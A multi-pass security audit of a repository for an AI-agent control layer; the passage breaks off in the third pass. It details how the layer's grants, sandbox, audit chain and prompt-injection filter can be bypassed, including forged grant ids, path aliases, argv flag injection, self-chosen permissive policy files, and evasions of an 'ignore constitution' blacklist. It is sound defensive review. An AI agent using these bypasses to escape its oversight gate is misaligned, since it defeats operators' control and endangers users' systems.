# AIOS_MERGED — Full-Source Security Audit

**Date:** 2026-09-20
**Scope:** every source file in the repo (296 non-doc source files: 116 Rust, 128 Python, 16 TypeScript src, 7 TOML, 2 YAML, 4 JSONL/JSON config, 3 shell)
**Method:** line-by-line review of the security boundary (classifier, PEP, dispatch, audit chain, sandbox, secrets scanner, file/path handling, process execution, archive/restore), plus exhaustive pattern sweeps (panics, byte-slicing, path joins, process spawn, SQL, deserialization, secrets, permissions) over every remaining file.
**Changes made:** none. This is a read-only audit; the only file written is this report.

---

## Executive summary

The platform's *architecture* is defensible: classifier → PEP grant → single audit row, hash-chained audit ring with segments/archives, bounded file reads, exclusive temp + fsync + rename for stores, zip-slip guards, and a real attempt at cross-substrate hash parity. The problems are at the **seams and the gates**:

1. **The authorization gate is mostly bypassed in practice.** 90 of 98 MCP tool call sites pass `require_grant=false`, and `PepStore::is_irreversible()` only recognises a hand-written allowlist of tool-name prefixes. Everything else — handoff, service, package, kernel_module, session/triage mutations, secrets scan — runs **with no grant at all**.
2. **The sandbox does nothing except a syscall blacklist.** Both implementations (Rust `sandbox.rs`, Python `sandbox.py`) pass `AT_FDCWD` as Landlock's `parent_fd`, so no path rule is ever installed. Every `aiosh run` / `process.run` therefore has **full filesystem access**, while the audit row still records `sandbox_applied`.
3. **`aiosh run` requires no grant.** `process.run` is neither irreversible nor refused (0.85 = "caution"), so arbitrary command execution is unauthenticated.
4. **Grant checks in module-level helpers accept any non-empty string** (`check_doc_index_policy`, `check_evidence_policy`, `check_toolchain_policy`, `check_release_policy`) — a forged grant id passes.
5. **Cross-substrate hash parity is broken for non-ASCII** (Python `json.dumps` defaults to `ensure_ascii=True`; Rust emits raw UTF-8); the audit chain silently fails to verify across surfaces.
6. **Six remotely-reachable panics** on multibyte input (byte-slicing / `String::truncate`) — trivial DoS of the CLI/MCP process.

---

## 1. CRITICAL

### C-1 — Landlock is never applied; the sandbox is a no-op file-ACL claim
* `code/aiosh-rust/aiosh-core/src/sandbox.rs:344-352` — `landlock_add_rule` is called with `parent_fd: AT_FDCWD` (-100). Landlock requires an **O_PATH fd** to the directory; the string path in `rule.path` is never used (dead `c_path`, `let _ = c_path;` at :372 confirms the intent). The kernel rejects the rule; the code then **skips `landlock_restrict_self` entirely** (`if ok { … }`, :368-375) and returns `FAIL`.
* `code/aiosh-mcp/aiosh_mcp/sandbox.py:337-340` — identical bug (`struct.pack("<Qi", bits, AT_FDCWD)`), in the Python executor that the TS CLI falls back to.
* `sandbox.rs:432-450` — the "unsupported → warn + continue" policy means the *child still execs* with no path restriction. `emit_sandbox_applied` (:466) then writes `{"event":"sandbox_applied", …}` so callers (TS `parseSandboxApplied`) treat the run as sandboxed even though the component line is `"FAIL: …"`.
**Impact:** `aiosh run`, `aiosh-sandbox`, and the Python shim provide **no filesystem isolation**; seccomp only blocks 17 syscalls. A command may read `~/.ssh/*`, write anywhere the user can, and exfiltrate.
**CWE-693/CWE-1188.** *Fix:* open each rule path with `O_PATH|O_CLOEXEC` and pass that fd; make any FAIL fatal unless `--allow-degraded` is explicit; never emit `sandbox_applied` when a component failed.

### C-2 — Unauthenticated arbitrary command execution (`process.run` / `aiosh run`)
* `code/aiosh-cli/src/pep.ts:65-71` — `isIrreversible()` = `fs.write*`, `pentest.*`, reboot, shutdown. `process.run` is absent. `code/aiosh-rust/aiosh-core/src/pep.rs:377-440` also omits it.
* `code/aiosh-rust/aiosh-core/src/classifier.rs:145-160` — R-05a/R-05b carry 0.85 confidence → verdict **"caution"**, not "refused" (locked in by the test at :594 `assert_eq!(r.overall_verdict, "caution")` for `rm -rf /`).
* `code/aiosh-cli/src/cli.ts:196-262` — `aiosh run` never checks a grant, never enforces `--yes`, and executes via `execFile` (no shell injection, good) with the broken sandbox above.
**Impact:** any caller (AI agent, MCP client, local user) gets RCE with the invoking user's privileges; the only filter is a 5-phrase string blacklist (`PROMPT_INJECTION_FRAGMENTS`) and 13 destructive-binary names.
**CWE-78/CWE-862.** *Fix:* treat `process.run` as irreversible (grant required) and refuse rather than caution on `DANGEROUS_BINS` + `DANGEROUS_ARG_FRAGMENTS`.

### C-3 — Authorization gap: 90/98 MCP tools run with no grant
* `code/aiosh-rust/aiosh-mcp/src/main.rs` — 98 `dispatch::recorded_call*` sites; only 8 pass `true` (`aios.session.action/create`, the four `aios.fs_layout.*` mutations, `aios.fs.read`, `aios.task`).
* `code/aiosh-rust/aiosh-core/src/pep.rs:377-440` — `is_irreversible()` covers `pentest.*`, `fs.write`, `aios.backup.*`, `aios.release.*`, `toolchain.set`, `doc.set`, `evidence.record/set`, `session.action/create`, the four `fs_layout` mutations, `system.reboot/shutdown`. Everything else is "reversible".
* Concretely ungated state mutations reachable from MCP: `aios.handoff.initiate/accept/reject/complete/cancel` (writes the handoff store; `main.rs:1441-1530`), `aios.service.action/order/config/policy`, `aios.package.apply/config/policy`, `aios.kernel_module.blacklist/unblacklist/autoload/unautoload/preset.apply`, `aios.triage.record/resolve`, `aios.session.config/policy`, `aios.distro.policy`, `aios.image.policy/config`.
**Mitigating nuance:** `service_service::execute_action` (:291) and the package/kernel_module stores are **in-memory simulations** (fake PIDs 1001/1002, no `systemctl`/`modprobe` spawn) — so today the blast radius is persistent JSON store state and audit-noise, not host mutation. That is a "not yet wired to the host" accident, not a control: the moment these are wired to real units, this becomes full system control.
**CWE-862.** *Fix:* invert the default — require a grant for every tool whose name is not in an explicit read-only allowlist.

### C-4 — Grant checks that accept any non-empty string
* `code/aiosh-rust/aiosh-core/src/release.rs:119-124` — `check_release_policy(Some("gr_xyz"), …)` → `Ok(())` (their own test at :135 asserts this).
* `doc_index_service.rs:266-276`, `evidence_service.rs:131-141`, `toolchain_service.rs:271-283` — same "presence" test.
**Impact:** a caller that relies on these helpers (they exist precisely to be the policy hook) accepts a fabricated/stale/expired grant id. No scope, expiry, revocation, or tool check is performed.
**CWE-287/CWE-863.** *Fix:* delete these helpers or make them delegate to `PepStore::check_with_paths`.

### C-5 — Audit-chain hash parity is broken for non-ASCII content
* `code/aiosh-mcp/aiosh_mcp/audit_client.py:34-39` — `json.dumps(obj, sort_keys=True, separators=(",",":"))` uses the **default `ensure_ascii=True`**, escaping non-ASCII as `\uXXXX`.
* `code/aiosh-rust/aiosh-core/src/canonical.rs:22-34` — `escape_json_string` emits raw UTF-8 (only `"`/`\`/control chars are escaped).
* The module docstrings in both files claim byte-identical output; `tests/test_smoke.py` only exercises ASCII.
**Impact:** any audit row containing a non-ASCII path, note, or model output hashes differently in each substrate. Mixed-substrate chains (TS CLI + Rust CLI + Python MCP — which is the documented design) will report `ok:false, broken_at:<row>` on a **pristine** ring. Forensics/retention archives inherit the same mismatch. Also `audit.rs:556` returns `"v0.0"` silently when the constitution file is unreadable (fail-open provenance).
**CWE-345.** *Fix:* `ensure_ascii=False` in Python (and a migration note), plus a cross-substrate golden-vector test with emoji/CJK/combining marks.

---

## 2. HIGH

### H-1 — Expectation-only grant checks in the Python gate + weaker irreversible list
`audit_client.py:520-580` `grant_check()` implements a *second* gate whose irreversible set is `pentest.*`, `fs.write`, reboot/shutdown only — no `aios.fs_layout.*`, `aios.backup.*`, `aios.release.*`, `aios.session.*`. The Python MCP server (`server.py:584`) therefore authorizes things the Rust surface refuses. Same class as C-3/C-4 and a direct cross-substrate policy divergence. **CWE-863.**

### H-2 — Path-scope checks in TS and Python are alias-evadable (deny bypass)
* `code/aiosh-cli/src/pep.ts:44-63` and `code/aiosh-mcp/aiosh_mcp/audit_client.py:365-395` do raw `startsWith` comparison with zero canonicalization — exactly the class the Rust port fixed (T-01537 S-18/S-19/S-22, see `pep.rs:150-330`).
* Bypasses on Windows (the dev platform): case variants (`C:\Secret` vs `c:\secret\x`), 8.3 short names (`C:\PROGRA~1`), trailing dot/space (`C:\Secret.\x`), device prefixes (`\\?\C:\Secret\x`), junctions. On macOS: NFD/NFC normalization differences.
**Impact:** a grant scoped `paths.deny: ["C:\\Secret"]` can still read/write that directory through any alias. **CWE-22/CWE-178.** *Fix:* port `canonical_path_key`/`canonical_store_key` semantics into `pep.ts` and `audit_client.py`, or route path decisions to the Rust core.

### H-3 — `restore_backup` zip-bomb bound is per-file, not cumulative
`code/aiosh-rust/aiosh-core/src/release.rs:333-364` — the accumulated check uses the archive's **declared** sizes (`file.size()`), then each entry is copied with `take(&mut file, MAX_UNCOMPRESSED_SIZE)` = 10 GB **per file**. A crafted zip whose central directory under-declares sizes passes the accumulator and can still write up to 10 GB × 100 000 entries. `validate_backup` (:280) also never checks the declared hash. **CWE-409.** *Fix:* `take(remaining_budget)`; verify `expected_hash` against the file in `validate_release` (:249 — currently uses it only for a length check, making "release validation" a no-op integrity claim).

### H-4 — Attacker-controlled release artifact path → traversal + whole-CWD packaging
`release.rs:26-36` builds `output/release/aios_{target_os}_{version}.iso` from unvalidated manifest fields and passes it to `genisoimage -o <path> .` (:172). `target_os="../../../../home/user/x"` writes outside the tree; the `.` source means the ISO contains **everything in the process CWD** (including `.env`, keys, the audit DB). **CWE-22/CWE-668.** *Fix:* allowlist `target_os`/`version` (`[A-Za-z0-9._-]{1,32}`), package an explicit staging dir.

### H-5 — Unauthenticated handoff state tampering (identity is caller-supplied)
`code/aiosh-rust/aiosh-core/src/handoff.rs:110-140` — `can_agent_act` grants universal access to the literal strings `operator`/`admin`/`root`, and otherwise compares the caller's `actor_id` to the record's `sender`/`receiver`. Both come from the same request; nothing authenticates them. `signature`/`id` are a plain content hash with no key, so "tamper-evident" is nominal. Combined with C-3 (no grant), any client can accept/cancel/complete any handoff by claiming the receiver identity. **CWE-287/CWE-345.**

### H-6 — Reachable panics on multibyte input (DoS of CLI/MCP)
Byte-slicing/`truncate` without char-boundary checks:
| Location | Code |
|---|---|
| `aiosh-core/src/handoff.rs:84,87` | `summary.truncate(4096)`, `payload.truncate(65536)` |
| `aiosh-core/src/triage.rs:71,76,81` | `test_target/error_message/repro_command.truncate(…)` |
| `aiosh-core/src/toolchain_service.rs:298` | `&trimmed[..max_len]` |
| `aiosh-core/src/secrets_service.rs:70,94,115` | `&line[..4096]`, `&scan_text[pos..pos+20]`, `[pos..pos+40]` |
| `aiosh-core/src/release.rs:153` | `&stderr[..4096]` |
A single 4096-byte multibyte line in a file (or a CJK/emoji arg over the cap) aborts the process. For `secrets_service` this is remotely triggerable by content the scanner is pointed at (any untrusted repo). **CWE-20/CWE-248.** *Fix:* `is_char_boundary`-safe truncation helpers (`floor_char_boundary` / iterate chars).

### H-7 — Secrets-scanner symlink recursion + partial secret disclosure
`secrets_service.rs:170-200` — `walk_dir` follows symlinks with no visited-inode set and no depth cap: a symlink loop (or a link to `/`) causes unbounded recursion → stack overflow; a link out of the root silently widens the scan scope. `secrets.rs:120-130` `redact_secret_value` keeps the first/last 4 characters of every secret in the report, i.e. the evidence artifacts and MCP responses leak 8 characters of live credentials (for a 20-char AWS key that is 40% of the secret). `secrets_config.rs` `allow_patterns`, `max_line_bytes`, `require_clean` are validated but **never used** (dead policy knobs giving a false sense of configurability). **CWE-674/CWE-532/CWE-1188.**

### H-8 — Audit durability and anchoring weaknesses
* `audit.rs:246-260` `write()` reads the head then inserts, with **no transaction and no lock**: two processes (documented design: TS + Rust + Python all write the same DB) can chain off the same `prev_hash` → fork → verification permanently fails. `UNIQUE(hash)` catches only byte-identical rows.
* `audit.rs:418` `delete_rows_le` / `retention.rs` rotation: there is **no external anchor**, so an attacker with DB access can truncate the tail and still verify "clean" (documented design limit — worth stating in SECURITY.md as a known limitation).
* `audit.rs:80-90` default DB path falls back to `/tmp/.aios/audit.db` when `HOME` is unset (world-writable dir), and the DB file is created with default umask (0644) while it stores **full grant tokens** (`grant_token` column) — archive files are 0600 (`retention.rs:432`) but the live DB is not. **CWE-276/CWE-345.** *Fix:* sqlite transaction around head+insert, `chmod 0600`, refuse to run with an unset/unsafe HOME.

### H-9 — `handoff`/`triage` records are not validated on load
`HandoffStore::load_or_recover` (used by every `aios.handoff.*`) parses records from a caller-named `store_path` (`main.rs:1418` default `.aios/handoff_store.json`); `validate_handoff_record` exists but is only enforced on write paths in tests. A crafted store file injects records with any sender/receiver/status — and the store path is a **free-form MCP argument** with no path-scope check when no grant is supplied (C-3), i.e. arbitrary file write (as JSON) to any path the user can write. **CWE-73.**

---

## 3. MEDIUM

* **M-1 `tool_glob_match` over-matches** — `pep.rs:18-32` strips `.*` then uses `starts_with`, so `pentest.*` also matches `pentestfoo`. Use `tool == prefix || tool.starts_with(prefix + ".")`. Same in `pep.ts:36` and `audit_client.py:346`.
* **M-2 `max_irreversible` is never enforced** — declared, serialized, hashed (`types.rs:170`), and checked nowhere. Dead policy field.
* **M-3 R-10 is dead** — `target_out_of_grant_scope` (`classifier.rs:205-215`) is never set by any caller in any substrate, so the "cross-ref" C-1 rule can never fire.
* **M-4 The prompt-injection control is a 5-phrase English blacklist** (`classifier.rs:24-28`), matched only against *argument* values (targets are exempt). `"ignore  constitution"` (double space), `"ignore-constitution"`, homoglyphs, or any other language evades it. Report it as defence-in-depth only.
* **M-5 Windows ledger lock is a lie** — `ledger.rs:660-670` `acquire_lock_timeout`'s `#[cfg(not(unix))]` branch returns a `FileLock` without locking anything, while the module doc claims "advisory flock guards against concurrent runs". On Windows (dev platform) concurrent `complete_task` runs lose updates / duplicate `seq`. Same for `append_event`'s read-then-append seq assignment.
* **M-6 `append_event`/`save_state_atomic` modes** — state/lock/events are created 0644; `cleanup_stale_tmp` (`ledger.rs:203`) deletes any `<state>.tmp.*` in the directory (predictable-name deletion in a possibly shared dir). Low practical impact; worth tightening.
* **M-7 `emit`/`commit` ordering** — `dispatch.rs:246` runs the tool body **before** `commit()`, which uses `.expect("audit row write failed")`: if the DB write fails, the side effect already happened and the process then panics. No compensating action. *Fix:* write the intent row first, or refuse to run with an unwritable ring.
* **M-8 `aiosh run` executor path is env-overridable** — `cli.ts:296` `AIOSH_SANDBOX_BIN`; `ai_agent.py:124-135` searches relative paths (`./code/aiosh-rust/target/debug/aiosh-mcp`) before installing absolutes — a checked-out repo can plant a fake MCP server / sandbox binary that runs with the user's privileges (CWE-427). `pentest.rs:80` likewise spawns `argv[0]` via PATH even though `host_has` already resolved an absolute path (`bin_path` is only reported, never used) → PATH-hijack of nmap/nikto/sqlmap when the grant is scoped only to `tool`/`target`.
* **M-9 `canonical()` escape gaps** — U+2028/2029 and DEL are emitted raw (valid JSON, but `</script>`-style hosts and some JSON consumers reject them); serde_json float formatting (`1e100`) vs Python `repr` (`1e+100`) diverges for exponent forms; Python `json.dumps` can emit `NaN`/`Infinity` (invalid JSON) that Rust cannot parse back.
* **M-10 `AuditRing::open` ignores failures** — `audit.rs:163` `let _ = create_dir_all(parent)`; a failed mkdir is swallowed before `Connection::open` reports a less precise error. `active_constitution_rev` failing open to `"v0.0"` is noted in C-5.
* **M-11 `unchecked_transaction` in rotation** — `retention.rs:470` begins a transaction on a shared `&Connection`; with another transaction already open this degrades to savepoint semantics, weakening the "all or none" claim for the segment row + delete + rotation row.
* **M-12 Non-network-target grants skip scope entirely** — `pep.rs:520` and `audit_client.py:560`: when `scope.networks` is empty, a `pentest.*` grant authorizes **any** address (the classifier is then the only net). Worth making empty `networks` + pentest an explicit, documented choice.
* **M-13 `validate_doc_links` / doc-index reads escape the root** — `doc_index_service.rs:198-260` `repo_root.join(rel_path)` accepts absolute/`..` caller paths (read-only, but an arbitrary-file read primitive that feeds `aios.doc.search` results).
* **M-14 Duplicate/divergent canonicalization** — `canonical_path_key` (anchored) vs `canonical_store_key` (unanchored) vs TS/Python `startsWith` vs `folder Windows aliases`: four implementations of "is this path the same path". Consolidate or expect the next bypass.

---

## 4. LOW / INFORMATIONAL

* `correlation` of `stdout_truncated`: `pentest.rs:158-160` compares **byte** length against a **char** cap → wrong `*_truncated` flags for multibyte output.
* `sandbox.rs:520-530` `fork()` inside a Rust process that may have threads — child runs allocator/stderr code after fork (deadlock risk). Use `posix_spawn`/direct exec.
* `sandbox.rs:26-30` syscall numbers/arch are x86_64-only; the BPF arch check *kills* every syscall on aarch64 (SIGSYS at startup) rather than refusing cleanly.
* 64-bit grant ids (`pep.rs:640`, `pep.ts:107`, `api_client` equivalent) for a bearer credential; no per-grant secret, no rate limit, stored in cleartext in the audit DB.
* `restore_backup` writes an audit row only on success; refusals (zip bomb, non-empty target) are unlogged.
* `release.rs:70,130` write `outcome: "success"` instead of the contract's `ok`/`refused`/`error`, and set all C-flags false — these rows will read as anomalies/are invisible to `ok`-filtering tooling.
* `generate_release`/`create_backup`'s `physical_create_zip` writes a **dummy manifest only** (`release.rs:195-215`): a "successful" backup contains no data while the audit row claims success — data-loss deception, worth a functional bug report.
* `recovery.rs` modules rename the corrupt store aside without an audit row (`distro_recovery.rs:101`).
* `tools/ci_run.py` + `ci_config.py` default results/logs to `/tmp/aiosh-ci-*.log` (predictable world-readable paths; symlink pre-planting).
* `docs` versus code: `SECURITY.md`/kernel-module docs claim controls (Landlock isolation, grant-gated mutations) that this audit shows are not enforced — the documentation overstates the security posture (in scope for a bug-bounty report as "security-relevant documentation defect").

## 5. Scan results that came back clean
* No hardcoded credentials anywhere in source/config (`api_key|secret|password|token = "…"` sweep over `.rs/.py/.ts/.js/.toml/.json/.yaml` — zero hits).
* No `shell=True`, `os.system`, `eval`/`exec`, `pickle`, or `yaml.load` in shipped source (only `sys.executable -c` in tests).
* No `unsafe` outside `sandbox.rs`, `ledger.rs` (flock), `pep.rs` (sqlite3_randomness), all of which were reviewed.
* No string-interpolated SQL with user input (the two `execute(f"…")` sites use compile-time constants).
* `aiosh-cli/src/*.ts` uses `execFile` with an argv array — no command-string interpolation.
* Rust `fs_layout` validation is genuinely strong (control-char/whitespace refusal on device/options, path hygiene, `deny_unknown_fields`, bounded reads, exclusive temp + fsync + rename + residue cap).

---

# SECOND PASS — 2026-09-20 (deeper sweep of the seams)

This pass re-read the entry points (Rust CLI, Rust MCP, Python MCP, TS CLI), the previously only
pattern-screened core modules, and proved/disproved the suspicions left open in pass 1.

## New: CRITICAL

### C-6 — `aios.backup.restore` has no gate at all (forged grant accepted)
`code/aiosh-rust/aiosh-mcp/src/main.rs:4179-4194` — the handler calls
`aiosh_core::release::restore_backup(&mut ReleaseCtx{…}, backup_path, target_dir, grant_id)`
**directly**: no `dispatch::recorded_call`, no classifier gate, no `PepStore` look-up.
The only check is `check_release_policy(grant, "aios.backup.restore")` (`release.rs:119-124`),
which tests `grant.is_none()` → **any non-empty string authorizes** (their own unit test asserts
`check_release_policy(Some("gr_xyz"), …).is_ok()`).
Consequences: an unauthenticated MCP caller can extract an attacker-supplied ZIP into any *empty*
directory (bounded only by H-3's broken zip-bomb bound), and the row the routine writes itself
carries `c_flags` all-false and `constitution_rev: "v0.0"` — violating the C-4 "audit always"
contract and carrying no classifier provenance (`policy_revision: None`).
The read-only siblings `aios.release.validate` / `aios.backup.validate` *do* go through
`recorded_call` (→ classifier refusal works there) but with `require_grant=false` and a
caller-named path, giving an unauthenticated existence/size/ZIP-structure oracle.
**CWE-862 + CWE-287.** *Fix:* route through `dispatch::recorded_call`; make
`check_release_policy` delegate to `PepStore::check_with_paths`.

### C-7 — The Rust CLI has no enforcement point; `emit()` accepts forged grant provenance
`grep -n 'pep\.check|check_with_paths|is_irreversible|require_grant' code/aiosh-rust/aiosh-cli/src/main.rs`
→ **zero matches.** Every subcommand (`run`, `mod`, `service`, `session`, `layout`, `package`,
`handoff`, `triage`, `release`, `backup`, `doc`, `evidence`, `distro`, `image`, `toolchain`)
reaches `classify_and_emit()` (`main.rs:122-141`), which classifies and writes a row but never
authorizes anything; `emit()` (`main.rs:87-119`) copies the caller-supplied `grant_token` straight
into the row's `grant_token` column with no validation. So:
* `aiosh run <cmd>` = unauthenticated host command execution (with the C-1 dead sandbox);
* every CLI mutation (`aiosh mod blacklist`, `aiosh service action`, `aiosh layout remove`, …)
is unauthenticated;
* the audit ring can be made to *look* as though a grant authorized an action that never had one
— an audit-integrity defect, not just an authorization one (CWE-862 + CWE-345).
*Fix:* one `pep.check_with_paths` call in `classify_and_emit` (refusing on `Err` before the side
effect), and record `grant_token` only after it validates.

## New: HIGH

### H-10 — Python MCP exposes ungated release/backup writers (exfiltration + arbitrary file write)
`code/aiosh-mcp/aiosh_mcp/release.py:184-215, 246-273` — both tools call
`dispatch_mod.dispatch(tool=…, grant_id=grant_id)` **without `require_grant=True`**, and
`audit_client.grant_check`'s irreversible set is only `pentest.*` / `fs.write` / reboot / shutdown,
so both are unauthenticated despite the docstrings saying "Requires PEP grant"
(and the Rust surface requires one). Impact:
* `aios.backup.create` → `physical_create_zip` walks **any caller-named directory**
(`os.walk(snapshot.target_path)`) and writes `aios_backup_<ts>.zip` into the process CWD
— an arbitrary-directory exfiltration primitive (`target_path: "/home/user"`).
* `aios.release.generate` → `artifact_path = f"{output_dir}/aios_{target_os}_{version}.iso"`
is caller-controlled text with `..`/`/` support, then `open(path, "wb")` truncates/creates it
→ arbitrary file creation/truncation (content `AIOS_ISO_MOCK`).
**CWE-862 + CWE-22 + CWE-668.**

### H-11 — Evidence verification trusts the manifest it is handed
`code/aiosh-rust/aiosh-core/src/evidence_service.rs:85-129` — `verify_evidence_manifest` validates
the manifest's *shape* and then compares each file against **the hash stored in that same
caller-supplied manifest**, with no anchor in the audit ring or any signed record. Regenerating the
manifest over tampered evidence makes `aios.evidence.verify` report PASS. Additionally
`repo_root.join(&record.file_path)` takes `file_path` from caller JSON, so a `..`/absolute entry
turns the verifier into an arbitrary-path existence + hash oracle. **CWE-345.**
*Fix:* pin manifests to the audit chain (record the manifest's own sha256 in a row, or require
`constitution_rev`-scoped signing) and reject paths that escape `repo_root`.

### H-12 — Python classifier still has the nested-argument injection blind spot
`code/aiosh-mcp/aiosh_mcp/classifier.py:282-305` `_scan_arg_text_for_pi` walks only *top-level*
strings and list elements, whereas the Rust implementation
(`classifier.rs:330-375 scan_value_for_pi`, documented as T-01537 S-2) recurses into nested objects.
The S-2 fix never reached the Python MCP server, so a payload nested one level down
(`{"layout": {"name": "ignore constitution"}}`) is refused by the Rust surface and **invisible to
C-3 in Python** — the substrate most people actually run. **CWE-693.**

## New: MEDIUM

* **M-15 — "Validated" is a library property, not a service property.** 30+ `validate_*` functions
have **zero production call sites** (only their own module + tests): `validate_handoff_record/report`,
`validate_triage_record/report`, `validate_kernel_module_store`, `validate_service_status`,
`validate_user_session_status`, `validate_package_transaction`, `validate_distro_profile`,
`validate_base_image_manifest`, `validate_repo_health_report`, `validate_manifest`, `validate_config`,
`validate_doc_links`, `validate_store_health`, `validate_hex_id`, `validate_path`, `validate_device_id`.
The CLI/MCP handlers deserialize stores with serde and act on them without invoking the validator,
so any invariant the model enforces is unenforced in production (this is the systemic root cause
behind H-9 and much of C-3/C-4).
* **M-16 — `deny_unknown_fields` on only 7 of 47 config/policy/store structs.** A misspelled policy
key is silently ignored — the same failure mode the fs_layout store fix (T-01544) called out
("a store spelled `active_layout` loaded successfully and silently kept the default") remains true
for the other ~40 documents, including grant-adjacent policy documents.
* **M-17 — The audit verifier panics on a tampered segment row instead of reporting tampering.**
`retention.rs:947-970` — `hex_to_bytes` silently truncates/skips invalid nibbles, while `bloom_test`
(`retention.rs:88-95`) indexes `bits[idx >> 3]` using `bloom_m_bits`/`bloom_k` **read from the same
row**; a short `bloom_hex` or an inflated/negative `bloom_m_bits` (`as usize`) panics
`aios.audit.seen` / `verify_full` — i.e. the tool used to detect DB tampering is crashed by DB
tampering (CWE-248). `seen(exact=true)` also reads `archive_path` from the row and opens it, so a
edited row makes the server touch arbitrary files.
* **M-18 — Rust port regressions vs the Python reference (both security-relevant).**
(i) `pentest.rs:80` spawns `argv[0]` through PATH although `host_has()` already resolved an absolute
`bin_path` — the Python wrapper uses the resolved path (`pentest.py:118`), so the Rust port
re-introduced the PATH-hijack that the reference avoids.
(ii) Rust builds the audit `command` string **unquoted** (`format!("nmap {}", target)`,
`pentest.rs:300`), while Python uses `shlex.quote` — a target containing `\n` or control characters
injects lines into the audit row's `command` column and into any terminal/JSON rendering of it.
(iii) Python `pentest_nmap(mode=…)` accepts `mode` (docstring advertises `"syn"`) and ignores it.
* **M-19 — Argument injection into the pentest binaries.** `target`/`url`/`pcap_path`/`wordlist`/
`interface` are appended as raw argv elements (`pentest.rs:290-430`), so a value beginning with `-`
is parsed as a *flag* by nmap/nikto/sqlmap/tshark/gobuster/airmon-ng (e.g. an nmap target of
`-oX/tmp/out` writes a file; `-iL` reads a target list from a file). The grant constrains only
`scope.networks`, which is skipped entirely when empty (M-12), and the classifier never sees a
leading-dash target. *Fix:* reject `-`-prefixed targets, and put `--` before the positional target
where the tool supports it (CWE-88).
* **M-20 — `--yes` is decorative.** `cli.ts:196` documents `--yes` as the C-3 acknowledgement and
neither the TS nor the Rust `run` path reads it.

## Verified clean this pass (suspicions disproved)

* **`aios.audit.rotate` is properly gated in all three substrates** — Rust `main.rs:4296-4303`
(`require_grant=true`, tool `audit.rotate`) and Python `server.py:297-300` (`require_grant=True`).
Retention cannot be used to truncate the live ring without a grant.
* **`aios.fs.read`'s safe-root check holds.** Rust canonicalizes *before* the prefix test
(`main.rs:4122-4133`); the `unwrap_or_else(|_| path.to_string())` fallback on a canonicalize failure
is not exploitable, because the subsequent `read_to_string` resolves the path the same way the
canonicalizer tried to (a `..` chain that canonicalize cannot resolve cannot be opened either).
Python's `Path.resolve()` + prefix test is likewise sound.
* **Python `retention.rotate` is the strongest implementation of the three**: `tempfile.mkstemp` in
the destination dir, `chmod 0600`, `os.replace`, `FileExistsError` before overwrite, and
`rollback()` + archive unlink on DB failure.
* **TS `canonicalJson` uses `JSON.stringify`**, which emits raw UTF-8 — so TypeScript and Rust
*agree* and **Python (`ensure_ascii=True`) is the sole outlier** in C-5. That narrows the fix to one
function (`audit_client.canonical`).

## Coverage note for this pass

Read closely: `aiosh-cli/src/main.rs` structure + `classify_and_emit`/`emit`/`cmd_run`/grant and
district handlers, `aiosh-mcp/src/main.rs` (fs.read, release/backup, audit.*, process.list,
handoff, fs_layout gate flags), `retention.rs` (+`seen`/hex/bloom), `handoff.rs`, `triage.rs`,
`release.rs`, `evidence_service.rs`, `secrets_service.rs`/`secrets_config.rs`, `sandbox.rs`,
`pep.rs`, `classifier.rs`, `dispatch.rs`, `audit.rs`, `canonical.rs`, `fs_layout*.rs`, `ledger.rs`,
Python `audit_client.py`/`sandbox.py`/`retention.py`/`release.py`/`pentest.py`/`classifier.py`/
`server.py`, `ai_agent.py`, TS `pep.ts`/`cli.ts`/`audit.ts`/`retention.ts` (plus pattern sweeps over
the whole tree). Still only pattern-screened (next candidates for a third pass): the pure data
models of `session*`, `distro*`, `base_image*`, `kernel_module*` (`_policy`, `_config`),
`package_policy`, `repo_health*`, `service_policy/config/recovery`, `ci*`, `doc_index*`,
`tools/*.py`, and `code/aiosh-cli/src/{agent,constitution,types}.ts`.

---

# THIRD PASS — 2026-09-20 (write paths, policy provenance, and the grant supply chain)

Method this pass: follow every caller-supplied string into a filesystem sink or an authorization
decision. Prior passes covered *reads* well; the **write** side and the *issuance* side of the grant
system had gaps. Five new findings, one of them root-level.

## New: HIGH

### N-1 — `store_path` is a caller-chosen, unvalidated write target (arbitrary file overwrite)

Fifty-seven call sites take `store_path` from the MCP arguments, and the store writers treat it as an
absolute destination:

* `aiosh-mcp/src/main.rs:1347-1349, 1416-1434, 3631, 3682, 3711, 3743, 3768` — default
`./.aios/handoff_store.json` / `./.aios/triage_store.json`, but any string is accepted. The only
validation that exists anywhere is a length/control-character check, and it is applied to
**9 of ~20** write-capable sites (`main.rs:2312, 2367, 2404, 2671, 2734, 2765, 2883, 2951, 3007`).
The handoff/triage/image/kernel-module tools have none at all.
* Sinks: `handoff_service.rs:230-247` (`create_dir_all(parent)` → `File::create(path.with_extension("tmp"))`
→ `fs::rename`), `triage_service.rs:134`, `base_image_service.rs:207-219`, `kernel_module_service.rs:144-181`,
`package_service.rs:470-497`, `distro_service.rs:97-107`.
* Every one of those tools passes `require_grant=false` (`aiosh-mcp/src/main.rs`, handoff/distro/image/
package/service/triage `recorded_call` sites), so no grant is involved.

**Impact.** Any MCP client can make the server create/overwrite a file at an arbitrary path with a
JSON body whose string fields the caller controls — e.g. `~/.ssh/config`, `~/.gitconfig`, a repo's
`.git/hooks/*`, another tool's config. `package_service.rs:485,496` and `base_image_service.rs:219`
force mode `0644` on both the temp file and the destination, so overwriting a previously `0600`
file **widens its permissions**. It is not code execution on its own (the content is JSON and the
rename does not follow a symlink), but it is an unauthenticated integrity/DoS primitive against the
operator's home directory, and it is the same primitive the store-tampering findings (H-9, M-15)
need to seed a hostile store. Reading is affected too: the same field loads JSON from any path.

**Fix.** One `resolve_store_path()` used by every tool: canonicalize, require the result to sit under
the AIOS home/workspace root, reject symlinked parents, never `create_dir_all` outside that root, and
write `0600` via the shared atomic-write helper (N-5).

### N-2 — The caller chooses its own enforcement level (`policy_path` + `mode: "audit"`)

Every policy type resolves as **file > env > default**, and the file comes straight from the request:

* `package_policy.rs:404-410`, `service_policy.rs:477-483`, `kernel_module_policy.rs:516-522`,
plus `session_config.rs:203`, `service_config.rs:245`, `package_config.rs:202`,
`base_image_config.rs` — `resolve(custom_path)` returns `from_file(path)` unconditionally.
* `from_file` only caps size (`MAX_POLICY_FILE_BYTES`) and calls `validate()`; **`validate()` never
constrains the mode field** (PP1 checks lengths/bounds only).
* Mode short-circuits the verdict: `package_policy.rs:284-288` `Audit => true`; same in
`service_policy.rs:391-395`; `session_policy.rs:327-331` has `Permissive => true` **unconditionally**;
`kernel_module_policy.rs:384-390, 433-437` keep only one or two rules alive in permissive mode.
* MCP exposure: `aios.package.policy`, `aios.package.config`, `aios.service.policy`,
